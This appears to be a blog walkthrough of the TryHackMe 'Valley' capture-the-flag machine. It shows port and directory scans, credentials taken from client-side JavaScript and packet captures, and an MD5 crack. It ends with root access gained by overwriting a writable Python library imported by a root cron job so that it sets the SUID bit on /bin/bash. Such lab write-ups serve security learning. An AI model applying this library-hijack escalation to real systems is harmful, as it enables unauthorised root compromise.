---
title: Valley
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Valley machine
  on TryHackMe.
slug: valley
---




```
`PORT      STATE SERVICE REASON  VERSION 22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 c2842ac1225a10f16616dda0f6046295 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU= |   256 429e2ff63e5adb51996271c48c223ebb (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg= |   256 2ea0a56cd983e0016cb98a609b638672 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky 80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu)) | http-methods:  |_  Supported Methods: OPTIONS HEAD GET POST |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.41 (Ubuntu) 37370/tcp open  ftp     syn-ack vsftpd 3.0.3`
```


> 3 ports

> 22
> 80
> 37370

```
❯ feroxbuster -u 'http://v.thm' -w /usr/share/wordlists/dirb/big.txt

403      GET        9l       28w      270c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      267c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      140l      394w     3940c http://v.thm/gallery/gallery.html
200      GET       38l      129w     1163c http://v.thm/index.html
200      GET       52l      106w      945c http://v.thm/styles.css
200      GET       32l       61w      924c http://v.thm/pricing/pricing.html
200      GET       38l      129w     1163c http://v.thm/
200      GET        3l       10w       57c http://v.thm/pricing/note.txt
301      GET        9l       28w      300c http://v.thm/gallery => http://v.thm/gallery/
301      GET        9l       28w      300c http://v.thm/pricing => http://v.thm/pricing/
301      GET        9l       28w      299c http://v.thm/static => http://v.thm/static/
[####################] - 3m     20483/20483   0s      found:9       errors:7      
[####################] - 3m     20469/20469   105/s   http://v.thm/ 
[####################] - 0s     20469/20469   43184/s http://v.thm/gallery/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     20469/20469   21615/s http://v.thm/pricing/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     20469/20469   58483/s http://v.thm/static/ => Directory listing (add --scan-dir-listings to scan) 

```

> in http://10.201.53.78/static/ see hidden dir http://10.201.53.78/static/00
```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

> so find dev

```
http://10.201.53.78/dev1243224123123/

have login forum

and saw two js file

button.js
dev.js

in dev.js

	```
	> loginButton.addEventListener("click", (e) => {
    > e.preventDefault();
    > const username = loginForm.username.value;
    > const password = loginForm.password.value;

    > if (username === "siemDev" && password === "california") {
        > window.location.href = "/dev1243224123123/devNotes37370.txt";
    > } else {
        > loginErrorMsg.style.opacity = 1;
    > }
> })
	
	```
	
	So found username & password after login saw another note
	
				```
				> dev notes for ftp server:
				-stop reusing credentials
				-check for any vulnerabilies
				-stay up to date on patching
				-change ftp port to normal port
				```
				
	
```

> so try to login wia ftp

```
❯ ftp 10.201.53.78 37370
Connected to 10.201.53.78.
220 (vsFTPd 3.0.3)
Name (10.201.53.78:kali): siemDev
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||27925|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
ftp> dir
229 Entering Extended Passive Mode (|||48954|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
ftp> get siemFTP.pcapng
local: siemFTP.pcapng remote: siemFTP.pcapng
229 Entering Extended Passive Mode (|||31509|)
150 Opening BINARY mode data connection for siemFTP.pcapng (7272 bytes).
100% |**************************************************************************************************************|  7272       16.27 MiB/s    00:00 ETA
226 Transfer complete.
7272 bytes received in 00:02 (3.20 KiB/s)
ftp> get siemHTTP1.pcapng
local: siemHTTP1.pcapng remote: siemHTTP1.pcapng
229 Entering Extended Passive Mode (|||16349|)
150 Opening BINARY mode data connection for siemHTTP1.pcapng (1978716 bytes).
100% |**************************************************************************************************************|  1932 KiB   67.87 KiB/s    00:00 ETA
226 Transfer complete.
1978716 bytes received in 00:28 (67.00 KiB/s)
ftp> get siemHTTP2.pcapng
local: siemHTTP2.pcapng remote: siemHTTP2.pcapng
229 Entering Extended Passive Mode (|||46872|)
150 Opening BINARY mode data connection for siemHTTP2.pcapng (1972448 bytes).
100% |**************************************************************************************************************|  1926 KiB  108.25 KiB/s    00:00 ETA
226 Transfer complete.
1972448 bytes received in 00:18 (106.12 KiB/s)
ftp> 



```

> after analyzing siemHTTP2.pcapng find something filtering http

```
Frame 2335: 605 bytes on wire (4840 bits), 605 bytes captured (4840 bits) on interface any, id 0
Linux cooked capture v1
Internet Protocol Version 4, Src: 192.168.111.136, Dst: 192.168.111.136
Transmission Control Protocol, Src Port: 47096, Dst Port: 80, Seq: 1, Ack: 1, Len: 537
Hypertext Transfer Protocol
HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "uname" = "valleyDev"
    Form item: "psw" = "ph0t0s1234"
        Key: psw
        Value: ph0t0s1234
    Form item: "remember" = "on"
```

> So login wia ssh found user.txt.

```
valleyDev@valley:~$ ls
user.txt

```

> and found something different file in home dir `valleyAuthenticator`

```
valleyDev@valley:/home$ ls
siemDev  valley  valleyAuthenticator  valleyDev
valleyDev@valley:/home$ 


```

> So i download to my machine wia using python server to invistigate after downloading I open it wia strings and find


```

❯ strings valleyAuthenticator

-^;x&
e6722920bab2326f8217e4
bf6b1b58ac
ddJ1cc76ee3
beb60709056cfbOW
elcome to Valley Inc. Authentica
[k0rHh
 is your usernad


I found two hash
	`e6722920bab2326f8217e4bf6b1b58ac
	 ddJ1cc76ee3beb60709056cfbOW`


After use those hash on cracker and found 

`|   |   |   |
|---|---|---|
|e6722920bab2326f8217e4bf6b1b58ac|md5|liberty123|
|ddJ1cc76ee3beb60709056cfbOW|Unknown|Unrecognized hash format.|`


use that `liberty123`pwd and login as valley wia ssh


```

> and invistigating find something

```
valley@valley:/$ cat etc/crontab

# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py


`find / -type f -name 'base64.py' -ls 2>/dev/null`

	valley@valley:/$ find / -type f -name 'base64.py' -ls 2>/dev/null
   263097     24 -rwxrwxr-x   1 root     valleyAdmin    20490 Oct  9 09:08 /usr/lib/python3.8/base64.py
     3929     20 -rwxr-xr-x   1 root     root           20382 Nov 14  2022 /snap/core20/1828/usr/lib/python3.8/base64.py
     3906     20 -rwxr-xr-x   1 root     root           20382 Jun 22  2022 /snap/core20/1611/usr/lib/python3.8/base64.py


```

> so know something here can writable so change so change like this

```
echo "import os;os.system('chmod u+s /bin/bash')" > /usr/lib/python3.8/base64.py
```

> and it work

```
valley@valley:/$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash

```

> so run like this

```
valley@valley:/$ bash -p
bash-5.0# cd /root
bash-5.0# ls
root.txt  snap
bash-5.0# cat root.txt

```